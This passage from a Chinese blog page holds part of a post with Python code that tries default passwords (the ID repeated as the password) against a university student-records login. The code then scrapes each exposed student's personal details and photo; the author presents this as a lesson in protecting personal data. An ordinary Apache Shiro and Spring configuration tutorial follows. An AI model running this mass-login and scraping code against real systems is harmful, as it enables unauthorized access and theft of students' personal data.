+<p><img src="http://upload-images.jianshu.io/upload_images/7134080-286f834fd46caf89.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="系统的登录界面"></p>
+<p>首先使用 Firefox 浏览器的开发者工具查看 HTTP 通信的一些信息：</p>
+<p><img src="http://upload-images.jianshu.io/upload_images/7134080-3ab0ec0d031193cc.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="登录请求 ( POST )"></p>
+<p>登录表单通过 POST 请求进行提交，参数是账号和密码，发送的也是明文</p>
+<p><img src="http://upload-images.jianshu.io/upload_images/7134080-986180eedc73180d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="表单参数"></p>
+<p>服务器返回的响应中 Set-Cookie 就相当于给用户下发的令牌，用户下一次请求的时候带上这块令牌，服务器就能认出来这个用户是否刚登录过。这个令牌是有时间限制的，每次请求都会刷新一次时间，如果两次请求之间间隔时间超过设定值，那么服务器就不认识用户了，这次会话就结束了，需要重新登录。</p>
+<p><img src="http://upload-images.jianshu.io/upload_images/7134080-d14eaf5437d7dfc4.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="登录的响应体"></p>
+<p>刚开始使用的是 requests ，用 for 循环实现，由于 requests 是同步的，所以效率很低，还会经常卡死。后来改成了协程，用的 gevent + urllib3，效率提升了上百倍。解析 HTML 用的 lxml 的 etree，图片的保存用 PIL 的 Image。</p>
+<p>先引入依赖<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"><span class="keyword">import</span> gevent</span><br><span class="line"><span class="keyword">import</span> urllib3</span><br><span class="line"><span class="keyword">import</span> pathlib</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> BytesIO</span><br><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br></pre></td></tr></table></figure></p>
+<p>创建 HTTP 连接池<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">http = urllib3.HTTPConnectionPool(</span><br><span class="line">    host=settings.SERVER_HOST,</span><br><span class="line">    port=settings.SERVER_PORT,</span><br><span class="line">    strict=<span class="keyword">False</span>,</span><br><span class="line">    maxsize=<span class="number">100</span>,</span><br><span class="line">    block=<span class="keyword">False</span>,</span><br><span class="line">    retries=<span class="number">100</span>,</span><br><span class="line">    timeout=<span class="number">10</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure></p>
+<p>请求头的一些固定信息可以预先设定好，伪装浏览器<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">header = &#123;<span class="string">'Accept'</span>: <span class="string">'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'</span>,</span><br><span class="line">    <span class="string">'Accept-Encoding'</span>: <span class="string">'gzip, deflate'</span>,</span><br><span class="line">    <span class="string">'Accept-Language'</span>: <span class="string">'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2'</span>,</span><br><span class="line">    <span class="string">'Cache-Control'</span>: <span class="string">'max-age=0'</span>,</span><br><span class="line">    <span class="string">'Connection'</span>: <span class="string">'Keep-alive'</span>,</span><br><span class="line">    <span class="string">'Host'</span>: settings.SERVER_HOST,</span><br><span class="line">    <span class="string">'Upgrade-Insecure-Requests'</span>: <span class="string">'1'</span>,</span><br><span class="line">    <span class="string">'User-Agent'</span>: <span class="string">'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0'</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>登录并验证是否是初始密码<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 账号校验器</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">InfoValidate</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.logger = InfoMain.logger</span><br><span class="line">        self.http = InfoMain.http</span><br><span class="line">        <span class="comment"># 有效账号</span></span><br><span class="line">        self.account_valid = []</span><br><span class="line">        <span class="comment"># 可爬账号</span></span><br><span class="line">        self.account_available = []</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">validate</span><span class="params">(self, all_account)</span>:</span></span><br><span class="line">        <span class="comment"># 将所有校验过程加入队列</span></span><br><span class="line">        jobs = [gevent.spawn(self.validate_account, self.http, a) <span class="keyword">for</span> a <span class="keyword">in</span> all_account]</span><br><span class="line">        gevent.joinall(jobs, timeout=<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">validate_account</span><span class="params">(self, http, account)</span>:</span></span><br><span class="line">        <span class="comment"># 登录请求参数</span></span><br><span class="line">        param = &#123;<span class="string">"zjh"</span>: account, <span class="string">"mm"</span>: account&#125;</span><br><span class="line">        header = headers.header</span><br><span class="line">        response = http.request(<span class="string">'POST'</span>, settings.URL_LOGIN, fields=param, headers=header)</span><br><span class="line">        self.logger.info(<span class="string">'发送请求&gt;&gt;&#123;&#125;'</span>.format(param))</span><br><span class="line">        self.logger.info(response.status)</span><br><span class="line">        <span class="comment"># 响应体解码</span></span><br><span class="line">        res_text = response.data.decode(<span class="string">'GB2312'</span>, <span class="string">'ignore'</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> res_text.find(<span class="string">'密码不正确'</span>) &gt; <span class="number">-1</span>:</span><br><span class="line">            <span class="comment"># 密码有误</span></span><br><span class="line">            self.account_valid.append(account)</span><br><span class="line">        <span class="keyword">elif</span> <span class="keyword">not</span> res_text.find(<span class="string">'证件号不存在'</span>) &gt; <span class="number">-1</span>:</span><br><span class="line">            <span class="comment"># 账号可爬</span></span><br><span class="line">            self.account_available.append(account)</span><br><span class="line">            self.account_valid.append(account)</span><br><span class="line">            self.logger.info(<span class="string">"账号可用&gt;&gt;&gt;&#123;&#125;"</span>.format(account))</span><br></pre></td></tr></table></figure></p>
+<p>至此已经获取了所有初始密码未修改的账号了，下面研究一下，要爬取的学籍信息页的规律</p>
+<p><img src="http://upload-images.jianshu.io/upload_images/7134080-974fdb14f78e7210.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="学籍信息页"></p>
+<p><img src="http://upload-images.jianshu.io/upload_images/7134080-ed103827cea8be42.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="table 的结构"></p>
+<p>一系列的信息都包裹在 <figure class="highlight plain"><figcaption><span>width </span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">基于之前对账号的测试，爬取学籍信息</span><br><span class="line"></span><br><span class="line">```python</span><br><span class="line"># 信息收集器</span><br><span class="line">class InfoCollect(object):</span><br><span class="line">    def __init__(self):</span><br><span class="line">        self.logger = InfoMain.logger</span><br><span class="line">        self.http = InfoMain.http</span><br><span class="line">        # 功能模块</span><br><span class="line">        self.mod_get_roll_info = settings.MOD_ROLL_INFO</span><br><span class="line">        self.mod_get_roll_img = settings.MOD_ROLL_IMG</span><br><span class="line"></span><br><span class="line">    def get_info_queue(self, accounts):</span><br><span class="line">        # 将所有信息收集过程加入队列</span><br><span class="line">        jobs = [gevent.spawn(self.get_info, a) for a in accounts]</span><br><span class="line">        gevent.joinall(jobs, timeout=0)</span><br><span class="line"></span><br><span class="line">    def get_info(self, stuid):</span><br><span class="line">        # 登录</span><br><span class="line">        param = &#123;&apos;zjh&apos;: stuid, &apos;mm&apos;: stuid&#125;</span><br><span class="line">        response = self.http.request(&apos;POST&apos;, settings.URL_LOGIN, fields=param)</span><br><span class="line">        # 保存 Cookie</span><br><span class="line">        cookie = response.headers[&apos;Set-Cookie&apos;].replace(&apos;; path=/&apos;, &apos;&apos;)</span><br><span class="line">        header = headers.header</span><br><span class="line">        header[&apos;cookie&apos;] = cookie</span><br><span class="line">        # 学籍信息</span><br><span class="line">        if self.mod_get_roll_info:</span><br><span class="line">            # 带 Cookie 访问学籍信息页</span><br><span class="line">            response_xjxx = self.http.request(&apos;GET&apos;, settings.URL_XJXX, headers=header)</span><br><span class="line">            text = response_xjxx.data.decode(&apos;GB2312&apos;, &apos;ignore&apos;)</span><br><span class="line">            # 解析页面内容</span><br><span class="line">            selector = etree.HTML(text)</span><br><span class="line">            text_arr = selector.xpath(&apos;//td[starts-with(@width,&quot;275&quot;)]/text()&apos;)</span><br><span class="line">            # 学籍信息</span><br><span class="line">            result = []</span><br><span class="line">            for info in text_arr:</span><br><span class="line">                result.append(info.strip())</span><br><span class="line">            self.save_info(result)</span><br><span class="line">        # 学籍照片</span><br><span class="line">        if self.mod_get_roll_img:</span><br><span class="line">            response_xjzp = self.http.request(&apos;GET&apos;, settings.URL_XJZP, headers=header)</span><br><span class="line">            image = Image.open(BytesIO(response_xjzp.data))</span><br><span class="line">            setpath = settings.PATH_IMG_SAVE</span><br><span class="line">            path = pathlib.Path(setpath)</span><br><span class="line">            if not path.exists():</span><br><span class="line">                path.mkdir()</span><br><span class="line">            setpath = setpath + &apos;/&apos; + stuid + &apos;.jpg&apos;</span><br><span class="line">            image.save(setpath)</span><br><span class="line">            self.logger.info(&apos;保存照片&gt;&gt;&gt;&#123;&#125;&apos;.format(setpath))</span><br><span class="line"></span><br><span class="line">        # 登出</span><br><span class="line">        self.http.request(&apos;POST&apos;, settings.URL_LOGOUT, headers=header)</span><br></pre></td></tr></table></figure></p>
+<p>至此，已经实现了所有信息的获取以及照片的保存。</p>
+<p>没改密码的同学们应该看到了，获取个人信息其实很简单，关键在于增强自己保护个人信息的意识。</p>
+<p>相关开源项目：URP_Spider  <a href="https://github.com/JamesZBL/URP_Spider" target="_blank" rel="noopener">https://github.com/JamesZBL/URP_Spider</a></p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="/2018/02/17/2018-02-17-Spring 应用中集成 Apache Shiro/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="摆码王子">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="James' Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2018/02/17/2018-02-17-Spring 应用中集成 Apache Shiro/" itemprop="url">Spring 应用中集成 Apache Shiro</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-02-17T09:55:00+08:00">
+                2018-02-17
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p>这一篇文章涵盖了将 Shiro 集成到基于 Spring 的应用程序的方法。</p>
+<p>Shiro 的 Java Bean兼容性使它非常适合通过 Spring XML 或其他基于 Spring 的配置机制进行配置。Shiro 的应用程序需要一个应用程序单例安全管理器 ( SecuriyManager) 实例。注意，这并不一定是静态的单例，但是应用程序应该只使用一个实例，不管它是否是静态的单例。</p>
+<h2 id="1-独立的应用程序"><a href="#1-独立的应用程序" class="headerlink" title="1.独立的应用程序"></a>1.独立的应用程序</h2><p>以下是在 Spring 应用程序中启用应用程序单例安全管理器的最简单方法:</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 定义连接到后端安全数据源的 Realm : --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"myRealm"</span> <span class="attr">class</span>=<span class="string">"..."</span>&gt;</span></span><br><span class="line">    ...</span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"securityManager"</span> <span class="attr">class</span>=<span class="string">"org.apache.shiro.mgt.DefaultSecurityManager"</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 单一 Realm 应用这样写。如果有多个 Realm ，可以使用 "realms" 属性 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"realm"</span> <span class="attr">ref</span>=<span class="string">"myRealm"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"lifecycleBeanPostProcessor"</span> <span class="attr">class</span>=<span class="string">"org.apache.shiro.spring.LifecycleBeanPostProcessor"</span>/&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 对于最简单的集成方式，就像所有的 SecurityUtils 中的静态</span></span><br><span class="line"><span class="comment">方法一样，在所有情况下都适用，将 securityManager bean 声明</span></span><br><span class="line"><span class="comment">为一个静态的单例对象。但不要在 web 应用程序中这样做。参见</span></span><br><span class="line"><span class="comment">下面的 “web 应用程序” 部分。  --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">class</span>=<span class="string">"org.springframework.beans.factory.config.MethodInvokingFactoryBean"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"staticMethod"</span> <span class="attr">value</span>=<span class="string">"org.apache.shiro.SecurityUtils.setSecurityManager"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"arguments"</span> <span class="attr">ref</span>=<span class="string">"securityManager"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<h2 id="2-Web-应用程序"><a href="#2-Web-应用程序" class="headerlink" title="2.Web 应用程序"></a>2.Web 应用程序</h2><p>Shiro 对 Spring web 应用程序有很棒的支持。在一个 web 应用程序中，所有的可用的 web 请求都必须经过 Shiro Filter。这个过滤器非常强大，允许基于 URL 路径表达式执行的特殊自定义任何过滤器链。</p>
+<p>在 Shiro 1.0之前，你必须在 Spring web 应用程序中使用一种混合的方法，定义 Shiro 的过滤器所有的配置属性都在 web.xml 中。但是在 spring.xml中定义 securityManager，这有点不友好。</p>
+<p>现在，在 Shiro 1.0 以上的版本中，所有的 Shiro 配置都是在Spring XML 中完成的，它提供了更健壮的 Spring 配置机制。<br>以下是如何在基于 spring 的 web 应用程序中配置 Shiro:</p>
+<h3 id="web-xml"><a href="#web-xml" class="headerlink" title="web.xml"></a>web.xml</h3><p>除了其他的 spring 的一些标签 ( ContextLoaderListener、Log4jConfigListener 等)，还定义了以下过滤器和过滤器的映射:<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 在 applicationContext.xml 中，过滤器名称 “shiroFilter” bean的名称匹配。--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">filter</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>shiroFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-class</span>&gt;</span>org.springframework.web.filter.DelegatingFilterProxy<span class="tag">&lt;/<span class="name">filter-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>targetFilterLifecycle<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>true<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 确保你想要的任何请求都可以被过滤。/ * 捕获所有</span></span><br><span class="line"><span class="comment">请求。通常，这个过滤器映射首先 （在所有其他的之前）定义，</span></span><br><span class="line"><span class="comment">确保 Shiro 在过滤器链的后续过滤器中工作:--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>shiroFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">filter-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
+<h3 id="applicationContext-xml"><a href="#applicationContext-xml" class="headerlink" title="applicationContext.xml"></a>applicationContext.xml</h3><p>在 applicationContext.xml 文件，定义 web 适用的SecurityManager 和 “shiroFilter” bean，这个bean 在 web.xml 中会被引用。</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"shiroFilter"</span> <span class="attr">class</span>=<span class="string">"org.apache.shiro.spring.web.ShiroFilterFactoryBean"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"securityManager"</span> <span class="attr">ref</span>=<span class="string">"securityManager"</span>/&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 根据具体情况定义以下几个属性:</span></span><br><span class="line"><span class="comment">    &lt;property name="loginUrl" value="/login.jsp"/&gt;</span></span><br><span class="line"><span class="comment">    &lt;property name="successUrl" value="/home.jsp"/&gt;</span></span><br><span class="line"><span class="comment">    &lt;property name="unauthorizedUrl" value="/unauthorized.jsp"/&gt; --&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 如果声明过任何的 javax.servlet，“filters” 属性就是不必要的了--&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- &lt;property name="filters"&gt;</span></span><br><span class="line"><span class="comment">        &lt;util:map&gt;</span></span><br><span class="line"><span class="comment">            &lt;entry key="anAlias" value-ref="someFilter"/&gt;</span></span><br><span class="line"><span class="comment">        &lt;/util:map&gt;</span></span><br><span class="line"><span class="comment">    &lt;/property&gt; --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"filterChainDefinitions"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">value</span>&gt;</span></span><br><span class="line">            # 定义需要过滤的 url :</span><br><span class="line">            /admin/** = authc, roles[admin]</span><br><span class="line">            /docs/** = authc, perms[document:read]</span><br><span class="line">            /** = authc</span><br><span class="line">            <span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 可以在上下文中定义的任何 javax.servlet.Filter bean，它们会自动被上面的 “shiroFilter” bean 所捕获，并为“filterChainDefinitions” 属性所用。如果需要的话，可以手动添加/显式添加到 shiroFilter 的 “filters” Map 上。--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"someFilter"</span> <span class="attr">class</span>=<span class="string">"..."</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"anotherFilter"</span> <span class="attr">class</span>=<span class="string">"..."</span>&gt;</span> ... <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"securityManager"</span> <span class="attr">class</span>=<span class="string">"org.apache.shiro.web.mgt.DefaultWebSecurityManager"</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 单一 Realm 应用这样写。如果有多个 Realm ，可以使用 "realms" 属性. --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"realm"</span> <span class="attr">ref</span>=<span class="string">"myRealm"</span>/&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 认情况下，适用 servlet 容器的 session 。取消对这一行的注释后则使用 shiro的原生 session  --&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- &lt;property name="sessionMode" value="native"/&gt; --&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"lifecycleBeanPostProcessor"</span> <span class="attr">class</span>=<span class="string">"org.apache.shiro.spring.LifecycleBeanPostProcessor"</span>/&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 通过自定义 Shiro Realm 的子类来使用后台的数据源 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"myRealm"</span> <span class="attr">class</span>=<span class="string">"..."</span>&gt;</span></span><br><span class="line">    ...</span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<h2 id="启用-Shiro-的注解"><a href="#启用-Shiro-的注解" class="headerlink" title="启用 Shiro 的注解"></a>启用 Shiro 的注解</h2><p>在应用程序中，可能需要使用 Shiro 的注释来进行安全检查(例如，@RequiresRole、@requiresPermission 等等。这需要 Shiro的 Spring AOP 集成，以扫描适当的带注释的类，并在必要时执行安全逻辑。下面是如何启用这些注释，将这两个 bean 定义添加到 applicationContext.xml 中:<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">class</span>=<span class="string">"org.springframework.aop.framework.autoproxy.DefaultAdvisorAutoProxyCreator"</span> <span class="attr">depends-on</span>=<span class="string">"lifecycleBeanPostProcessor"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">class</span>=<span class="string">"org.apache.shiro.spring.security.interceptor.AuthorizationAttributeSourceAdvisor"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"securityManager"</span> <span class="attr">ref</span>=<span class="string">"securityManager"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="/2017/12/01/2017-12-02-在 SpringMVC 中对表单提交参数进行验证 Bean Validator/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="摆码王子">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="James' Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2017/12/01/2017-12-02-在 SpringMVC 中对表单提交参数进行验证 Bean Validator/" itemprop="url">在 SpringMVC 中对表单提交参数进行验证（使用 Bean Validator）</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-12-01T19:25:00+08:00">
+                2017-12-01
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
